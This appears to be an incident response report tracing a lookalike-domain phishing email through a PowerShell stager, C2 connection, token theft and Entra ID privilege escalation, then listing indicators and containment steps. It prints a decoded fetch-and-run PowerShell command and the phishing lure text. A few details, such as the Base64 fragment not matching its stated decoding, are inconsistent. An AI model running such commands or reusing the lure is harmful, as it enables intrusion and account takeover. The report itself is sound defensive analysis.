# Investigation Report #3 — Cross-Domain Email Incident

## 1. Executive Summary
On October 21, 2026, the SOC responded to concurrent alerts involving encoded PowerShell execution on endpoint `HOST-ADM-02` and anomalous administrative privilege escalation in Entra ID for user `s.taylor@global-corp.com` (Senior Systems Administrator). Cross-domain telemetry correlation confirmed a multi-stage attack starting from an unauthenticated email originating from a lookalike domain (`global-corp-helpdesk.com`). User interaction with a password-protected zip file resulted in local stager execution (`SecUpdate.exe`), secondary payload retrieval (`svc_check.exe`), host registry persistence, and active C2 communication with `185.220.101.99:443`.

The threat actor extracted valid authentication tokens from `HOST-ADM-02` and authenticated via PowerShell from Germany using the C2 IP (`185.220.101.99`), bypassing multi-factor authentication (MFA). The adversary self-elevated `s.taylor` to the `Global Administrator` role and established a persistent cloud backdoor by registering a high-privilege Service Principal (`GraphAutomationEngine`) with `Directory.ReadWrite.All` API permissions. Full host isolation, session revocation, tenant privilege restoration, and persistent artifact cleanups were completed.

---

## 2. Incident Scenario & Raw Telemetry

### Scenario Context
- **Alert Source:** Defender for Endpoint (Encoded PowerShell) & Defender for Identity (Anomalous Admin Role Assignment)
- **Target User:** Sarah Taylor (`s.taylor@global-corp.com`) — Senior Systems Administrator
- **Target Workstation:** `HOST-ADM-02` (`10.10.2.88`)
- **Compromise Window:** `2026-10-21T11:02:14Z` – `2026-10-21T11:14:05Z`

---

### 2.1 Inbound Email Gateway Telemetry (`mx.global-corp.com`)
```email
Received: from mail-relay-02.global-corp-helpdesk.com (mail-relay-02.global-corp-helpdesk.com [198.51.100.105])
    by mx.global-corp.com (MTA v8.1) with ESMTP id 88301924
    for <s.taylor@global-corp.com>; Wed, 21 Oct 2026 11:02:14 +0000
Received-SPF: softfail (google.com: domain of transitioning domain of support@global-corp-helpdesk.com does not designate 198.51.100.105 as permitted sender) client-ip=198.51.100.105;
Authentication-Results: mx.global-corp.com;
    spf=softfail (sender IP is 198.51.100.105) smtp.mailfrom=support@global-corp-helpdesk.com;
    dkim=fail header.i=@global-corp-helpdesk.com header.s=s2026;
    dmarc=fail (p=none; dis=none) header.from=global-corp-helpdesk.com;
From: "IT Service Desk" <support@global-corp-helpdesk.com>
To: "Sarah Taylor" <s.taylor@global-corp.com>
Subject: URGENT: Mandatory Endpoint Security Patch v4.2 Installation
Date: Wed, 21 Oct 2026 11:02:10 +0000
Message-ID: <20261021110210.99214@global-corp-helpdesk.com>
Content-Type: text/html; charset="UTF-8"
```

#### Email Body Content
```text
From: IT Service Desk <support@global-corp-helpdesk.com>
Subject: URGENT: Mandatory Endpoint Security Patch v4.2 Installation

Dear Sarah,

An urgent security vulnerability has been identified across admin workstations. 
Please download and run the mandatory patch utility immediately from our internal repository:

hxxps://global-corp-helpdesk[.]com/downloads/SecUpdate_v4.2.zip

Password for zip archive: Patch2026!

Thank you,
IT Infrastructure Team
Global Corp
```

---

### 2.2 Web Proxy & Endpoint Telemetry (Host: `HOST-ADM-02`, User: `s.taylor`)

#### A. Web Proxy Logs
| Timestamp (UTC) | Source Host / IP | User | Method | Destination URL | Status | Size |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| `11:05:12Z` | `HOST-ADM-02` (`10.10.2.88`) | `s.taylor` | GET | `hxxps://global-corp-helpdesk[.]com/downloads/SecUpdate_v4.2.zip` | 200 OK | 1.4 MB |

#### B. Endpoint Events (Sysmon & Windows Security Logs)
| Timestamp (UTC) | Log Source / Event ID | Image / Process | Parent Process | Command Line / Key Action | Context / Details |
| :--- | :--- | :--- | :--- | :--- | :--- |
| `11:06:05Z` | Sysmon ID 11 (FileCreate) | `7zFM.exe` | `explorer.exe` | TargetFilename: `C:\Users\s.taylor\AppData\Local\Temp\SecUpdate.exe` | SHA256: `a4f8...b912` |
| `11:06:18Z` | Sysmon ID 1 (ProcessCreate) | `SecUpdate.exe` | `7zFM.exe` | `C:\Users\s.taylor\AppData\Local\Temp\SecUpdate.exe` | PID: `4812` |
| `11:06:20Z` | Sysmon ID 1 (ProcessCreate) | `powershell.exe` | `SecUpdate.exe` | `powershell.exe -e QmVnaW4gRG93bmxvYW...` *(Decodes to: `Invoke-WebRequest -Uri hxxps://c2-srv[.]net/bin/agent.exe -OutFile C:\ProgramData\Updater\svc_check.exe; Start-Process C:\ProgramData\Updater\svc_check.exe`)* | PID: `5104` |
| `11:06:25Z` | Sysmon ID 11 (FileCreate) | `powershell.exe` | `powershell.exe` | TargetFilename: `C:\ProgramData\Updater\svc_check.exe` | SHA256: `f91c...382e` |
| `11:06:28Z` | Sysmon ID 1 (ProcessCreate) | `svc_check.exe` | `powershell.exe` | `C:\ProgramData\Updater\svc_check.exe --service` | PID: `5420` |
| `11:06:30Z` | Sysmon ID 13 (RegistryValue) | `svc_check.exe` | N/A | TargetObject: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SysUpdater` | Details: `C:\ProgramData\Updater\svc_check.exe` |
| `11:06:45Z` | Sysmon ID 3 (NetworkConnect) | `svc_check.exe` | N/A | Destination: `185.220.101.99:443` | Initiated TCP C2 Connection |

---

### 2.3 Entra ID Telemetry (`SigninLogs` & `AuditLogs`)

#### A. Entra ID Sign-In Logs (`SigninLogs`)
| TimeGenerated (UTC) | UserPrincipalName | IPAddress | Location | ClientAppUsed | Status.errorCode | ConditionalAccessStatus | MFA Result |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| `10:30:15Z` | `s.taylor@global-corp.com` | `203.0.113.4` | US (Chicago) | Browser | 0 | success | Satisfied in session |
| `11:10:02Z` | `s.taylor@global-corp.com` | `185.220.101.99` | DE (Frankfurt) | PowerShell | 0 | notApplied | Token Reused / Primary Auth |

#### B. Entra ID Audit Logs (`AuditLogs`)
| TimeGenerated (UTC) | InitiatedBy | ActivityDisplayName | Target Resource | Modified Properties / Details |
| :--- | :--- | :--- | :--- | :--- |
| `11:12:40Z` | `s.taylor@global-corp.com` | Add member to role | `Privileged Role` | Added `s.taylor@global-corp.com` to `Global Administrator` role |
| `11:14:05Z` | `s.taylor@global-corp.com` | Add service principal | `GraphAutomationEngine` | Created App Registration (AppID: `9b2a...7c11`) with `Directory.ReadWrite.All` permissions |

---

## 3. Cross-Domain Technical Analysis

### 3.1 Inbound Delivery & Domain Impersonation
The email headers confirm authentication failures across SPF (`softfail`), DKIM (`fail`), and DMARC (`fail`). The connecting MTA (`198.51.100.105`) was unauthenticated to send on behalf of `global-corp.com`. The adversary registered a lookalike domain (`global-corp-helpdesk.com`) to impersonate internal IT support and trick senior administrative personnel.

### 3.2 Host Execution Tree & Local Persistence
Proxy telemetry confirmed user interaction at `11:05:12Z` (downloading `SecUpdate_v4.2.zip`). The archive was extracted using `7zFM.exe`. Sysmon telemetry revealed the full process execution hierarchy:

$$\text{explorer.exe} \longrightarrow \text{7zFM.exe} \longrightarrow \text{SecUpdate.exe (PID 4812)} \longrightarrow \text{powershell.exe (PID 5104)} \longrightarrow \text{svc_check.exe (PID 5420)}$$

PowerShell executed a Base64-encoded command downloading the secondary agent (`agent.exe`) from `hxxps://c2-srv[.]net/bin/agent.exe` into `C:\ProgramData\Updater\svc_check.exe`. Persistence was established by writing a Registry Run key (`HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SysUpdater`), followed by an active encrypted TCP connection to `185.220.101.99:443`.

### 3.3 Token Theft & Entra ID Identity Pivot
Following C2 connection establishment, the attacker extracted active session/Primary Refresh Tokens (PRT) from workstation `HOST-ADM-02`. Using the C2 IP (`185.220.101.99`) via a PowerShell command-line client, the attacker authenticated to Entra ID at `11:10:02Z`. Because a valid session token claim was presented, Conditional Access MFA prompts were bypassed.

### 3.4 Tenant Control-Plane Escalation & Backdoor Persistence
At `11:12:40Z`, the attacker utilized the hijacked session to add `s.taylor` to the `Global Administrator` role. At `11:14:05Z`, the attacker registered an App Registration / Service Principal named `GraphAutomationEngine` (`9b2a...7c11`) assigned `Directory.ReadWrite.All` application permissions. This established a persistent, non-human cloud backdoor that allows programmatically controlling the tenant via Microsoft Graph API calls using OAuth 2.0 Client Credentials, bypassing user password resets.

---

## 4. End-to-End Timestamped Attack Timeline

```
[11:02:14Z] Email Delivery: Spoofed email received from support@global-corp-helpdesk.com (SPF/DKIM/DMARC FAIL)
     │
[11:05:12Z] Proxy GET: HOST-ADM-02 (s.taylor) downloads SecUpdate_v4.2.zip (HTTP 200 OK)
     │
[11:06:05Z] File Extraction: 7zFM.exe creates C:\Users\s.taylor\AppData\Local\Temp\SecUpdate.exe
     │
[11:06:18Z] Stager Execution: SecUpdate.exe (PID 4812) launched by user
     │
[11:06:20Z] Encoded Execution: SecUpdate.exe spawns powershell.exe (PID 5104) with Base64 payload
     │
[11:06:25Z] Payload Staging: PowerShell drops secondary C2 payload C:\ProgramData\Updater\svc_check.exe
     │
[11:06:28Z] Agent Execution: svc_check.exe (PID 5420) launched as service background process
     │
[11:06:30Z] Registry Persistence: HKCU\...\Run\SysUpdater modified to execute svc_check.exe on login
     │
[11:06:45Z] C2 Established: Network connection initiated from svc_check.exe to 185.220.101.99:443
     │
[11:10:02Z] Token Theft Sign-in: SigninLogs record PowerShell auth from 185.220.101.99 (DE) using stolen PRT/token
     │
[11:12:40Z] Privilege Escalation: Attacker adds s.taylor@global-corp.com to Global Administrator role
     │
[11:14:05Z] Cloud Persistence: Service Principal GraphAutomationEngine registered with Directory.ReadWrite.All
```

---

## 5. Indicators of Compromise (IOCs)

| IOC Type | Value | Context / Details |
| :--- | :--- | :--- |
| **IPv4** | `198.51.100.105` | Inbound Phishing Relay IP (`mail-relay-02.global-corp-helpdesk.com`) |
| **IPv4** | `185.220.101.99` | External Command & Control (C2) & Entra Sign-in IP |
| **Domain** | `global-corp-helpdesk.com` | Malicious Lookalike Phishing Domain |
| **Domain** | `c2-srv[.]net` | Secondary Payload Stage Hosting Domain |
| **SHA256** | `a4f8...b912` | Initial Stager (`SecUpdate.exe`) Binary Hash |
| **SHA256** | `f91c...382e` | C2 Agent (`svc_check.exe`) Binary Hash |
| **App ID** | `9b2a...7c11` | Malicious Service Principal (`GraphAutomationEngine`) |
| **Reg Key** | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SysUpdater` | Host Persistence Location |

---

## 6. Executed Containment & Remediation Actions

```
               ┌──────────────────────────────────────────────┐
               │    Categorized Response Summary (5-Pillars)  │
               └──────────────────────┬───────────────────────┘
                                      │
     ┌──────────────┬─────────────────┼─────────────────┬──────────────┐
     ▼              ▼                 ▼                 ▼              ▼
  [BLOCK]        [RESET]           [REVOKE]         [ISOLATE]      [MONITOR]
 Perimeter      Credentials &     Tokens, Roles &   Workstation    Graph API &
 Filtering       Passkeys          App Backdoor     HOST-ADM-02    Directory Calls
```

### 1. Block
- Added IP addresses `185.220.101.99` and `198.51.100.105` to perimeter firewall and web proxy blocklists.
- Blocked domains `global-corp-helpdesk.com` and `c2-srv[.]net` at DNS and email gateway controls.
- Created hash-based block rules in EDR for stagers `SecUpdate.exe` (`a4f8...b912`) and `svc_check.exe` (`f91c...382e`).

### 2. Reset
- Performed mandatory password reset and re-issued authentication credentials / FIDO2 keys for `s.taylor@global-corp.com`.

### 3. Revoke
- Executed `Revoke-MgUserSignInSession` to invalidate all active Entra ID refresh tokens and Primary Refresh Tokens (PRTs) for `s.taylor@global-corp.com`.
- Stripped the unauthorized `Global Administrator` role assignment from `s.taylor@global-corp.com`.
- Deleted the unauthorized App Registration / Service Principal `GraphAutomationEngine` (`9b2a...7c11`) and revoked associated `Directory.ReadWrite.All` API permissions.

### 4. Isolate
- Network-isolated host `HOST-ADM-02` (`10.10.2.88`) via Defender for Endpoint to prevent lateral movement and server socket communication.
- Terminated running malicious process PIDs (`4812`, `5104`, `5420`).
- Removed file `C:\ProgramData\Updater\svc_check.exe` and deleted registry value `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SysUpdater`.

### 5. Monitor
- Configured real-time Microsoft Sentinel alerts for any API calls originating from App ID `9b2a...7c11` or IP `185.220.101.99`.
- Initiated a tenant-wide audit for any additional App Registrations created between `11:00Z` and `12:00Z`.

---

## 7. Telemetry Limitations & Uncertainty

1. **Credential/Token Extraction Telemetry:** Absence of Sysmon Event ID 10 (ProcessAccess) or LSASS memory audit logging leaves the precise mechanism of local token extraction on `HOST-ADM-02` unverified.
2. **Graph API Modifications:** Lack of detailed Graph API diagnostic logs during the `11:14Z` to `11:25Z` window prevents verifying whether directory objects were queried or modified prior to Service Principal deletion.